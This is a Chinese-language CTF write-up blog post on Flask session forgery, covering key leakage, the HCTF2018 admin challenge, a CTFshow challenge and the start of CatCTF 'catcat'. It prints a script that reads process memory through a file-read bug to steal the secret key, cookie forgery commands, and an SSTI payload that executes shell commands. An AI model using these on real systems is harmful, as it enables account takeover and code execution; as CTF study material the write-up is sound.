{"title":"浅析Flask Session伪造","uid":"ac14ba8545a9348cf23ed9e993a44b8f","slug":"Flask Session伪造","date":"2023-01-05T14:55:20.000Z","updated":"2023-07-24T08:43:50.000Z","comments":true,"path":"api/articles/Flask Session伪造.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141552551.jpeg","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>Flask的Session伪造之前并未有太多了解，在跨年夜的CatCTF中遇到了<code>catcat</code>这道题，因此对此类题目进行一个简单总结，<code>lx56</code>大师傅已经对Flask有很详细的介绍了，因此这里是站在巨人的肩膀上看世界了属于是，膜拜大佬。</p>\n<h1 id=\"Flask\"><a href=\"#Flask\" class=\"headerlink\" title=\"Flask\"></a>Flask</h1><p>什么是Flask呢，他其实是一个基于Jinja2模板搭建而成的应用框架，具体如下所示</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>Flask是一个Web应用程序框架，使用Python编写。该软件由ArminRonacher开发，他领导着Pocco国际Python爱好者小组。该软件基于WerkzeugWSGI工具箱和Jinja2模板引擎.</p></blockquote>\n<h2 id=\"Session\"><a href=\"#Session\" class=\"headerlink\" title=\"Session\"></a>Session</h2><p><code>Flask</code>中的<code>Session</code>，它是存在于客户端的，也就是说我们在进行登录过后可以看到自己的<code>Session</code>值，而当我们对这个<code>Session</code>值进行<code>base64</code>解码后，就可以读取它的具体内容。<br>对应Flask，它在生成session时会使用<code>app.config[&#39;SECRET_KEY&#39;]</code>中的值作为<code>salt</code>对session进行一个简单处理，那么这里的话，只要key不泄露，我们就只能得到具体内容，但是无法修改具体内容，因此这个时候就引发了一个问题，当key泄露的时候，就出现了内容伪造的情况，比如具体内容为<code>&#123;&#39;name&#39;:&#39;123&#39;&#125;</code>，而当我们掌握key时，可修改内容为<code>&#123;&#39;name&#39;:&#39;admin&#39;&#125;</code>，从而达到一个越权的效果，因此我们接下来就要说说CTF中怎么获取Key</p>\n<h3 id=\"Key的获取\"><a href=\"#Key的获取\" class=\"headerlink\" title=\"Key的获取\"></a>Key的获取</h3><p>有两种情况<br>第一种情况，当源码泄露时，Key也可能会泄露，它的泄露位置是<code>config.py</code>，在<code>[HCTF2018]admin</code>中有所体现。<br>第二种情况，就是当存在任意文件读取漏洞时，我们可以通过读取<code>/proc/self/maps</code>来获取堆栈分布，而后读取<code>/proc/self/mem</code>，通过真正则匹配筛选出我们需要的key，这个在<code>[2022蓝帽杯]file_session</code>中有所体现。<br>这里就以他为例来说一下这个Key的获取，其源码如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">\n<span class=\"token keyword\">import</span> base64\n<span class=\"token keyword\">import</span> os\n<span class=\"token keyword\">import</span> uuid\n\n<span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> Flask<span class=\"token punctuation\">,</span> request<span class=\"token punctuation\">,</span> session<span class=\"token punctuation\">,</span> render_template\n\n<span class=\"token keyword\">from</span> pickle <span class=\"token keyword\">import</span> _loads\n\nSECRET_KEY <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>uuid<span class=\"token punctuation\">.</span>uuid4<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\napp <span class=\"token operator\">=</span> Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span>\napp<span class=\"token punctuation\">.</span>config<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span><span class=\"token builtin\">dict</span><span class=\"token punctuation\">(</span>\n    SECRET_KEY<span class=\"token operator\">=</span>SECRET_KEY<span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token comment\"># apt install python3.8</span>\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> <span class=\"token string\">\"/download?file=?\"</span>\n\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/download'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">download</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>SECRET_KEY<span class=\"token punctuation\">)</span>\n    filename <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'file'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"static/image/1.jpg\"</span><span class=\"token punctuation\">)</span>\n    offset <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'offset'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0\"</span><span class=\"token punctuation\">)</span>\n    length <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'length'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> offset <span class=\"token operator\">==</span> <span class=\"token string\">\"0\"</span> <span class=\"token keyword\">and</span> length <span class=\"token operator\">==</span> <span class=\"token string\">\"0\"</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">,</span> <span class=\"token string\">\"rb\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        offset<span class=\"token punctuation\">,</span> length <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>length<span class=\"token punctuation\">)</span>\n        f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">,</span> <span class=\"token string\">\"rb\"</span><span class=\"token punctuation\">)</span>\n        f<span class=\"token punctuation\">.</span>seek<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">)</span>\n        ret_data <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span>length<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> ret_data\n\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/filelist'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">filelist</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>listdir<span class=\"token punctuation\">(</span><span class=\"token string\">'./static/image/'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> /download?file=static/image/1.jpg\"</span></span>\n\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/admin_pickle_load'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">admin_pickle_load</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'data'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        data <span class=\"token operator\">=</span> _loads<span class=\"token punctuation\">(</span>base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">[</span><span class=\"token string\">'data'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> data\n    session<span class=\"token punctuation\">[</span><span class=\"token string\">\"data\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span><span class=\"token string\">b\"error\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token string\">'admin pickle'</span>\n\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    app<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>host<span class=\"token operator\">=</span><span class=\"token string\">'0.0.0.0'</span><span class=\"token punctuation\">,</span> debug<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span> port<span class=\"token operator\">=</span><span class=\"token number\">8888</span><span class=\"token punctuation\">)</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>可以看到它的这个key是随机生成的uuid，在download路由中存在key，我们这里注意到他有三个参数，分别是<code>file</code>、<code>offset</code>以及<code>length</code>，接下来按我们刚刚所说，第一步通过<code>/proc/self/maps</code>读取堆栈分布，然后在读取<code>/proc/self/mem</code>的内存数据。这里的话需要说明一下，内存中存在一个动态库<code>/usr/local/lib/faketime/libfaketime.so.1</code>，这个动态链接库是可以劫持程序获取时间时的返回值。<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141554621.png\" alt=\"在这里插入图片描述\"><br>因此我们这里可以使用这个来进行一个简单筛选，读取出堆栈分布，接下来进行读取内存，此时用一个uuid格式的正则匹配，就可以得到key（由于没有找到复现环境，这里使用的截图参考自其他师傅的Wp）</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests<span class=\"token punctuation\">,</span> re\n\nurl <span class=\"token operator\">=</span> <span class=\"token string\">\"http://192.168.244.133:7410/\"</span>\nmaps_url <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>url<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">/download?file=/proc/self/maps\"</span></span>\nmaps_reg <span class=\"token operator\">=</span> <span class=\"token string\">\"([a-z0-9]&#123;12&#125;-[a-z0-9]&#123;12&#125;) rw.*?00000000 00:00 0\"</span>\nmaps <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span>maps_reg<span class=\"token punctuation\">,</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>maps_url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># print(maps)</span>\n<span class=\"token keyword\">for</span> m <span class=\"token keyword\">in</span> maps<span class=\"token punctuation\">:</span>\n    start<span class=\"token punctuation\">,</span> end <span class=\"token operator\">=</span> m<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\"-\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\"-\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n    Offset<span class=\"token punctuation\">,</span> Length <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>start<span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>end<span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>start<span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    read_url <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>url<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">/download?file=/proc/self/mem&amp;offset=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>Offset<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">&amp;length=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>Length<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span>\n    s <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>read_url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>content\n    rt <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span><span class=\"token string\">b\"[a-z0-9]&#123;8&#125;-[a-z0-9]&#123;4&#125;-[a-z0-9]&#123;4&#125;-[a-z0-9]&#123;4&#125;-[a-z0-9]&#123;12&#125;\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> rt<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>rt<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141554567.png\" alt=\"在这里插入图片描述\"><br>此时就可以进行Session伪造了</p>\n<h1 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h1><h2 id=\"CTFshow内部赛-蓝瘦\"><a href=\"#CTFshow内部赛-蓝瘦\" class=\"headerlink\" title=\"CTFshow内部赛[蓝瘦]\"></a>CTFshow内部赛[蓝瘦]</h2><p>题目环境<a href=\"https://ctf.show/challenges#%E8%93%9D%E7%98%A6-214\">https://ctf.show/challenges</a><br>打开题目是一个环境框<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141554668.png\" alt=\"在这里插入图片描述\"><br>看源代码是否有注释<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141554576.png\" alt=\"在这里插入图片描述\">两个注释</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>param：参数，这里的话就可能是提示有名为ctfshow的参数<br>key：这里的话联想到FLask的Secret_key</p></blockquote>\n<p>随便输入一下，成功进入<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141554592.png\" alt=\"在这里插入图片描述\"><br>界面回显admin，看一下cookie</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">Cookie<span class=\"token punctuation\">:</span> session<span class=\"token operator\">=</span>eyJ1c2VybmFtZSI6IjEifQ<span class=\"token punctuation\">.</span>Y7bSGw<span class=\"token punctuation\">.</span>KsS3ZA9BBEYGaflk2Sm5wS3dthw<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>用<code>flask_session_cookie_manager3.py</code>进行解密</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">python flask_session_cookie_manager3<span class=\"token punctuation\">.</span>py decode <span class=\"token operator\">-</span>s <span class=\"token string\">\"ican\"</span> <span class=\"token operator\">-</span>c <span class=\"token string\">\"eyJ1c2VybmFtZSI6IjEifQ.Y7bNzg.k_DFbUcMkBDAZwZuKR2gvFuiQhc\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141554647.png\" alt=\"在这里插入图片描述\"><br>得到数据为<code>&#123;&#39;username&#39;:&#39;1&#39;&#125;</code>，猜测这里应该是想让我们修改为<code>admin</code>，因此修改<code>1</code>为<code>admin</code>，而后进行加密</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">python flask_session_cookie_manager3<span class=\"token punctuation\">.</span>py encode <span class=\"token operator\">-</span>t <span class=\"token string\">\"&#123;'username':'admin'&#125;\"</span> <span class=\"token operator\">-</span>s <span class=\"token string\">\"ican\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141554985.png\" alt=\"在这里插入图片描述\"><br>将得到的Session去替换网站上的<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141554998.png\" alt=\"在这里插入图片描述\"><br>提示缺少参数，这里想到之前的<code>ctfshow</code>，拿上去看看<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141554032.png\" alt=\"在这里插入图片描述\"><br>有回显，想到这里可能是SSTI，检验一下<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141554063.png\" alt=\"在这里插入图片描述\"><br>用语句直接打</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#123;</span>config<span class=\"token punctuation\">.</span>__init__<span class=\"token punctuation\">.</span>__globals__<span class=\"token punctuation\">[</span><span class=\"token string\">'__builtins__'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'eval'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"__import__('os').popen('env').read()\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token operator\">//</span>ls后没找到flag，猜测藏环境变量里了，因此直接看env即可<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141554109.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"HCTF2018-admin\"><a href=\"#HCTF2018-admin\" class=\"headerlink\" title=\"[HCTF2018]admin\"></a>[HCTF2018]admin</h2><p>题目环境<a href=\"https://buuoj.cn/challenges#%5BHCTF%202018%5Dadmin\">[HCTF2018]admin</a><br>进入环境后发现有两个功能点，注册和登录<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141554162.png\" alt=\"在这里插入图片描述\">联想到SQL的二次注入，但尝试过后发现并非如此，此时无意间查看到修改界面处的源代码中存在注释<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141554448.png\" alt=\"在这里插入图片描述\"><br>应该是源代码,查看配置文件后发现<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141554473.png\" alt=\"在这里插入图片描述\"><br>key泄露，这里应该是考察Flask的session伪造，因此我们接下来对Cookie中的Session进行解密</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">python flask_session_cookie_manager3<span class=\"token punctuation\">.</span>py decode <span class=\"token operator\">-</span>s <span class=\"token string\">\"ckj123\"</span> <span class=\"token operator\">-</span>c <span class=\"token string\">\"Session值\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141554562.png\" alt=\"在这里插入图片描述\"><br>修改<code>name</code>为<code>admin</code>，再进行加密</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">python flask_session_cookie_manager3<span class=\"token punctuation\">.</span>py encode <span class=\"token operator\">-</span>t <span class=\"token string\">\"修改name为admin后的json字符串\"</span> <span class=\"token operator\">-</span>s <span class=\"token string\">\"ckj123\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141554604.png\" alt=\"在这里插入图片描述\"><br>替换一下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141554585.png\" alt=\"在这里插入图片描述\"><br>成功获取Flag</p>\n<h2 id=\"CatCTF-cat-cat\"><a href=\"#CatCTF-cat-cat\" class=\"headerlink\" title=\"CatCTF[cat cat]\"></a>CatCTF[cat cat]</h2><p>题目环境<a href=\"https://ctfm.lxscloud.top/category/test/challenge/13\">https://ctfm.lxscloud.top/category/test/challenge/13</a><br>发现有file，尝试目录穿越，读取文件源码<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141554630.png\" alt=\"在这里插入图片描述\"><br>代码有点乱，这里可以⽤ <code>bytes </code>的 <code>decode()</code>⽅法获取格式化的源码<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141554847.png\" alt=\"在这里插入图片描述\"><br>整体源码如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> os\n<span class=\"token keyword\">import</span> uuid\n<span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> Flask<span class=\"token punctuation\">,</span> request<span class=\"token punctuation\">,</span> session<span class=\"token punctuation\">,</span> render_template<span class=\"token punctuation\">,</span> Markup\n<span class=\"token keyword\">from</span> cat <span class=\"token keyword\">import</span> cat\n\nflag <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\napp <span class=\"token operator\">=</span> Flask<span class=\"token punctuation\">(</span>\n    __name__<span class=\"token punctuation\">,</span>\n    static_url_path<span class=\"token operator\">=</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span>\n    static_folder<span class=\"token operator\">=</span><span class=\"token string\">'static'</span>\n<span class=\"token punctuation\">)</span>\napp<span class=\"token punctuation\">.</span>config<span class=\"token punctuation\">[</span><span class=\"token string\">'SECRET_KEY'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>uuid<span class=\"token punctuation\">.</span>uuid4<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"-\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"*abcdefgh\"</span>\n<span class=\"token keyword\">if</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>isfile<span class=\"token punctuation\">(</span><span class=\"token string\">\"/flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    flag <span class=\"token operator\">=</span> cat<span class=\"token punctuation\">(</span><span class=\"token string\">\"/flag\"</span><span class=\"token punctuation\">)</span>\n    os<span class=\"token punctuation\">.</span>remove<span class=\"token punctuation\">(</span><span class=\"token string\">\"/flag\"</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token 